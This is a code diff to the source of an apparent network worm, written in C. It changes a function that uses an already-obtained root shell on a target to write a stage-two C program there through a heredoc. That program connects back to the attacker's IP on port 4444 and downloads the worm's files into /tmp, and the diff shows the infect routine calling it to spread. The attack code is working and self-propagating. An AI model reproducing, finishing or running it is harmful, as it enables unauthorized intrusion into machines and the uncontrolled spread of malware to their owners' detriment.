@@ -8,110 +8,95 @@
 #define RECEIVE_FILE_BSD_PATH "/receive_file_bsd.c"
 #define WORM_PATH "/worm.c"
 
+
 /**
  * Deploys receive_file_bsd.c on target machine
  * sock - The active root shell
+ * my_ip - The IP of the current machine for the target to connect back to
  */
-void deploy_receive_file(int sock) {
+void deploy_receive_file(int sock, char *my_ip) {
     char cmd_buf[IO_BUF_SIZE];
-    
+    // Allocate a buffer on the heap bc really big string
+    char *formatted_source = (char *)malloc(10000); 
+    if (formatted_source == NULL) return;
+
     const char *file_contents = 
-        "#include <stdio.h>\n"
-        "#include <sys/types.h>\n"
-        "#include <sys/socket.h>\n"
-        "#include <netinet/in.h>\n"
-        "#include <sys/time.h>\n"
-        "#include <arpa/inet.h>\n\n"
-        "#define SERVER_IP \"172.17.0.1\"\n"
-        "#define SERVER_PORT 4444\n"
-        "#define IO_BUF_SIZE 2048\n\n"
-        "int send_int(num, fd) int num; int fd; {\n"
-        "    unsigned long conv = htonl((unsigned long)num);\n"
-        "    char *data = (char*)&conv;\n"
-        "    int left = sizeof(conv);\n"
-        "    int rc;\n"
-        "    do {\n"
-        "        rc = write(fd, data, left);\n"
-        "        if (rc < 0) return -1;\n"
-        "        else { data += rc; left -= rc; }\n"
-        "    } while (left > 0);\n"
-        "    return 0;\n"
-        "}\n\n"
-        "int receive_int(num, fd) int *num; int fd; {\n"
-        "    unsigned long ret;\n"
-        "    char *data = (char*)&ret;\n"
-        "    int left = sizeof(ret);\n"
-        "    int rc;\n"
-        "    do {\n"
-        "        rc = read(fd, data, left);\n"
-        "        if (rc <= 0) return -1;\n"
-        "        else { data += rc; left -= rc; }\n"
-        "    } while (left > 0);\n"
-        "    *num = ntohl(ret);\n"
-        "    return 0;\n"
-        "}\n\n"
-        "int main() {\n"
-        "    int i, j, n;\n"
-        "    int server_sock, file_size, len, num_files;\n"
-        "    struct timeval tv;\n"
-        "    struct sockaddr_in serv_addr;\n"
-        "    char io_buf[IO_BUF_SIZE];\n"
-        "    fd_set read_fds;\n"
-        "    FILE *outfile;\n"
-        "    char *file_name;\n"
-        "    char *msg = \"Files recieved\\n\";\n"
-        "    char *hello = \"Hello from client!\\n\";\n\n"
-        "    server_sock = socket(AF_INET, SOCK_STREAM, 0);\n"
-        "    if (server_sock < 0) return 1;\n"
-        "    bzero((char *)&serv_addr, sizeof(serv_addr));\n"
-        "    serv_addr.sin_family = AF_INET;\n"
-        "    serv_addr.sin_port = htons(SERVER_PORT);\n"
-        "    serv_addr.sin_addr.s_addr = inet_addr(SERVER_IP);\n\n"
-        "    while (connect(server_sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {\n"
-        "        sleep(1);\n"
-        "    }\n\n"
-        "    while (1) {\n"
-        "        write(server_sock, hello, strlen(hello));\n"
-        "        FD_ZERO(&read_fds);\n"
-        "        FD_SET(server_sock, &read_fds);\n"
-        "        tv.tv_sec = 5; tv.tv_usec = 0;\n"
-        "        if (select(server_sock + 1, &read_fds, (fd_set *)0, (fd_set *)0, &tv) > 0) {\n"
-        "            if (receive_int(&num_files, server_sock) < 0) continue;\n"
-        "            send_int(num_files, server_sock);\n"
-        "            for (i = 0; i < num_files; i++) {\n"
-        "                if (receive_int(&len, server_sock) < 0) continue;\n"
-        "                file_name = (char *)malloc((len + 1) * sizeof(char));\n"
-        "                n = read(server_sock, file_name, len);\n"
-        "                file_name[n] = '\\0';\n"
-        "                outfile = fopen(file_name, \"w\");\n"
-        "                if (receive_int(&file_size, server_sock) < 0) continue;\n"
-        "                while (file_size > 0) {\n"
-        "                    n = read(server_sock, io_buf, IO_BUF_SIZE -1);\n"
-        "                    if (n > 0) { io_buf[n] = '\\0'; fputs(io_buf, outfile); }\n"
-        "                    file_size -= n;\n"
-        "                }\n"
-        "                fclose(outfile); free(file_name);\n"
-        "                send_int(i, server_sock);\n"
-        "            }\n"
-        "            write(server_sock, msg, strlen(msg));\n"
-        "            break;\n"
-        "        }\n"
-        "    }\n"
-        "    close(server_sock);\n"
-        "    return 0;\n"
-        "}\n";
+    "#include <stdio.h>\n"
+    "#include <sys/types.h>\n"
+    "#include <sys/socket.h>\n"
+    "#include <netinet/in.h>\n"
+    "#include <sys/time.h>\n"
+    "#include <arpa/inet.h>\n\n"
+    "#define SERVER_IP \"%s\"\n" // This %s will be replaced with my_ip
+    "#define SERVER_PORT 4444\n"
+    "#define IO_BUF_SIZE 2048\n\n"
+    "int send_int(num, fd) int num; int fd; {\n"
+    "    unsigned long conv = htonl((unsigned long)num);\n"
+    "    char *data = (char*)&conv; int left = sizeof(conv); int rc;\n"
+    "    do {\n"
+    "        rc = write(fd, data, left);\n"
+    "        if (rc < 0) return -1;\n"
+    "        else { data += rc; left -= rc; }\n"
+    "    } while (left > 0);\n"
+    "    return 0;\n"
+    "}\n\n"
+    "int receive_int(num, fd) int *num; int fd; {\n"
+    "    unsigned long ret; char *data = (char*)&ret; int left = sizeof(ret); int rc;\n"
+    "    do {\n"
+    "        rc = read(fd, data, left);\n"
+    "        if (rc <= 0) return -1;\n"
+    "        else { data += rc; left -= rc; }\n"
+    "    } while (left > 0);\n"
+    "    *num = ntohl(ret); return 0;\n"
+    "}\n\n"
+    "int main() {\n"
+    "    int i, n, server_sock, file_size, len, num_files;\n"
+    "    struct sockaddr_in serv_addr; char io_buf[IO_BUF_SIZE], path[256];\n"
+    "    FILE *outfile; char *file_name;\n\n"
+    "    server_sock = socket(AF_INET, SOCK_STREAM, 0);\n"
+    "    if (server_sock < 0) return 1;\n"
+    "    bzero((char *)&serv_addr, sizeof(serv_addr));\n"
+    "    serv_addr.sin_family = AF_INET; serv_addr.sin_port = htons(SERVER_PORT);\n"
+    "    serv_addr.sin_addr.s_addr = inet_addr(SERVER_IP);\n\n"
+    "    while (connect(server_sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) sleep(1);\n\n"
+    "    write(server_sock, \"Hello\\n\", 6);\n"
+    "    if (receive_int(&num_files, server_sock) < 0) return 1;\n"
+    "    send_int(num_files, server_sock);\n\n"
+    "    for (i = 0; i < num_files; i++) {\n"
+    "        if (receive_int(&len, server_sock) < 0) break;\n"
+    "        file_name = (char *)malloc(len + 1);\n"
+    "        read(server_sock, file_name, len); file_name[len] = '\\0';\n"
+    "        sprintf(path, \"/tmp/%%s\", file_name);\n" // using %%s to preserve literal %s
+    "        outfile = fopen(path, \"w\");\n"
+    "        if (receive_int(&file_size, server_sock) >= 0) {\n"
+    "            while (file_size > 0) {\n"
+    "                n = read(server_sock, io_buf, (file_size < IO_BUF_SIZE) ? file_size : IO_BUF_SIZE);\n"
+    "                if (n <= 0) break;\n"
+    "                fwrite(io_buf, 1, n, outfile);\n"
+    "                file_size -= n;\n"
+    "            }\n"
+    "        }\n"
+    "        fclose(outfile); free(file_name);\n"
+    "        send_int(i, server_sock);\n"
+    "    }\n"
+    "    close(server_sock); return 0;\n"
+    "}\n";
+
+    // Inject the actual IP into the template
+    sprintf(formatted_source, file_contents, my_ip);
 
     // Start the cat command
     write_to_sock(sock, "cat > /tmp/receive_file.c << 'EOF'\n");
 
     // Send file contents
-    write_to_sock(sock, (char *)file_contents);
+    write_to_sock(sock, formatted_source);
     write_to_sock(sock, "EOF\n");
     sleep(5);
 
     // cleanup
     memset(cmd_buf, 0, IO_BUF_SIZE);
     read_from_sock(sock, cmd_buf, IO_BUF_SIZE);
+    free(formatted_source);
 }
 
 /**
@@ -344,7 +329,7 @@ void infect(char *ip) {
 	fflush(stdout);
 
 	// Send receive_file_bsd.c (vector) over
-	deploy_receive_file(sock);
+	deploy_receive_file(sock, my_ip);
 
     // Compile and run receive_file, should pull in worm.c and worm.h from attakcer
 	printf("[*] Compiling receive_file.c on target...\n");
